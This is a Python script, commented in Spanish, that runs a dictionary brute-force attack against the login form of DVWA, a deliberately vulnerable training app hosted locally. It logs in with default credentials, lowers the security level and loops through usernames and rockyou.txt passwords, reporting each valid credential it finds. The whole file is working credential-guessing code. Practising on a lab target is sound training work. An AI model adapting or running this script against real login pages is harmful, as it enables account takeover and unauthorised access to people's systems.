import requests
from bs4 import BeautifulSoup
import time
import random

# =================================================================
# CONFIGURACIÓN DEL ENTORNO
# (sin cambios)
# =================================================================
DVWA_URL = "http://localhost:90"
LOGIN_URL = f"{DVWA_URL}/login.php"
BRUTE_URL = f"{DVWA_URL}/vulnerabilities/brute/"

DVWA_USER = "admin"
DVWA_PASS = "password"

ARCHIVO_USUARIOS = "Users.txt"
ARCHIVO_CONTRASENAS = "rockyou.txt"

# =================================================================
# FUNCIONES DE CARGA DE DICCIONARIOS
# (sin cambios)
# =================================================================

def load_dictionary(file_path):
    """
    Carga los elementos de un archivo de texto, uno por línea, 
    utilizando codificación latin-1 para compatibilidad.
    """
    try:
        with open(file_path, 'r', encoding='latin-1') as f:
            return [linea.strip() for linea in f if linea.strip()]
    except FileNotFoundError:
        print(f"[x] Error: El archivo '{file_path}' no fue encontrado.")
        return []

# =================================================================
# FUNCIONES DE AUTENTICACIÓN
# (sin cambios)
# =================================================================

def login_to_dvwa():
    """
    Inicia sesión en DVWA y devuelve la sesión.
    """
    print(f"\n[*] Intentando iniciar sesión en DVWA con {DVWA_USER}/{DVWA_PASS}")
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_tag = soup.find('input', {'name': 'user_token'})
        csrf_token = token_tag.get('value')
        
        login_data = {
            'username': DVWA_USER,
            'password': DVWA_PASS,
            'Login': 'Login',
            'user_token': csrf_token
        }
        
        session.post(LOGIN_URL, data=login_data, timeout=10)
        print("    [!] Sesión de DVWA iniciada con éxito.")
        return session
            
    except Exception as e:
        print(f"    [x] Error al iniciar sesión. Revisa la URL y las credenciales: {e}")
        return None

# =================================================================
# FUNCIÓN DE ATAQUE (MODIFICADA)
# =================================================================

def brute_force_attack(session, users_list, passwords_list):
    """
    Realiza el ataque de fuerza bruta. 
    MODIFICADO: Pasa al siguiente usuario inmediatamente después de 
    encontrar una contraseña válida.
    """
    
    # Intenta configurar la seguridad a nivel bajo (GET)
    session.get(f"{DVWA_URL}/security.php?security=low&seclev_submit=Submit")
    
    valid_credentials = []
    
    # 1. Variables de progreso y velocidad
    # NOTA: El cálculo de total_attempts es menos preciso ahora, ya que no se probarán todas
    # las contraseñas, pero aún sirve como una estimación máxima.
    attempts_made = 0
    total_attempts = len(users_list) * len(passwords_list) 
    start_time = time.time()
    last_report_time = start_time
    
    print(f"[*] Iniciando ataque de fuerza bruta (OPTIMIZADO) contra un máximo de {total_attempts:,} combinaciones.")
    
    # Bucle anidado para probar cada combinación
    for user in users_list:
        print(f"\n[->] Probando contraseñas para el usuario: {user}")
        
        for password in passwords_list:
            
            attempts_made += 1
            
            # 2. Lógica del reporte de progreso (sin cambios)
            current_time = time.time()
            if current_time - last_report_time >= 60:
                elapsed_time = current_time - start_time
                # Nota: attempts_remaining es ahora solo una estimación.
                
                speed = attempts_made / elapsed_time if elapsed_time > 0 else 0
                
                print(f"\n[📊 REPORTE DE PROGRESO 📊]")
                print(f"  Tiempo transcurrido: {elapsed_time/60:.1f} minutos")
                print(f"  Intentos realizados: {attempts_made:,}")
                print(f"  Velocidad: {speed:.2f} intentos/segundo")
                print("-" * 50)
                
                last_report_time = current_time 

            try:
                # Parámetros para la petición GET (típico en DVWA low)
                params = {
                    'username': user,
                    'password': password,
                    'Login': 'Login'
                }
                
                # Petición GET para el ataque
                response = session.get(BRUTE_URL, params=params, timeout=5)
                
                # Criterio de éxito
                if "Welcome to the password protected area" in response.text:
                    credential = f"{user}:{password}"
                    valid_credentials.append(credential)
                    print(f"\n    [!!!] ¡ÉXITO! Credencial encontrada: {credential}")
                    # 🔑 MODIFICACIÓN CLAVE: Salir del bucle de contraseñas y pasar al siguiente usuario
                    break 
                
            except Exception as e:
                # Si hay un error de conexión, se salta el intento y se continúa
                continue
    
    # Reporte final
    end_time = time.time()
    duration = end_time - start_time
    attempts_per_second = attempts_made / duration if duration > 0 else attempts_made

    print(f"\n[🚀 FINALIZADO 🚀]")
    print(f"  Tiempo total: {duration:.2f} segundos")
    print(f"  Intentos totales realizados: {attempts_made:,}")
    print(f"  Velocidad media: {attempts_per_second:.2f} intentos/segundo")

    return valid_credentials

# =================================================================
# BLOQUE DE EJECUCIÓN PRINCIPAL
# (sin cambios)
# =================================================================

if __name__ == "__main__":
    
    # 1. Cargar diccionarios desde archivos
    USERS = load_dictionary(ARCHIVO_USUARIOS)
    PASSWORDS = load_dictionary(ARCHIVO_CONTRASENAS)

    if not USERS or not PASSWORDS:
        print("[x] Error: No se puede continuar sin listas de usuarios y contraseñas válidas.")
    else:
        # 2. Obtener la sesión de DVWA
        dvwa_session = login_to_dvwa()
        
        if dvwa_session:
            # 3. Ejecutar el ataque, pasando las listas cargadas
            found_credentials = brute_force_attack(dvwa_session, USERS, PASSWORDS)
            
            # 4. Imprimir resultados
            if found_credentials:
                print("\nCREDENCIALES VÁLIDAS ENCONTRADAS EN DVWA:")
                print("========================================")
                for cred in found_credentials:
                    print(f"{cred}")
                print("========================================")
            else:
                print("\nNo se encontraron credenciales válidas en DVWA.")